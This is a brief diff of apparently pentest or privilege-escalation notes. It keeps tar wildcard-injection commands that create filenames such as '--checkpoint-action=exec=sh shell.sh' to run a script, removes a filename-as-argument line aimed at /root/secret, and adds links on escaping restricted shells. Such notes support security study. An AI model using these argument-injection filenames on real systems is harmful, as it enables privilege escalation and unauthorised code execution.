@@ -14,13 +14,14 @@ touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
 
-Attacker Controlled Directory 
-
-touch "--reference=/root/secret``file"   # ← filename becomes an argument
-
 
 
 # Restricted Shell 
+[Resource-1](https://github.com/The-Red-Serpent/restricted-shell-escape-cheatsheet)
+
+[Resource 2](https://blog.pentesteracademy.com/breaking-out-of-a-restricted-shell-linux-privilege-escalation-3fb2700cb85e)
+
+[Resource 3] (https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/)
 
 
 
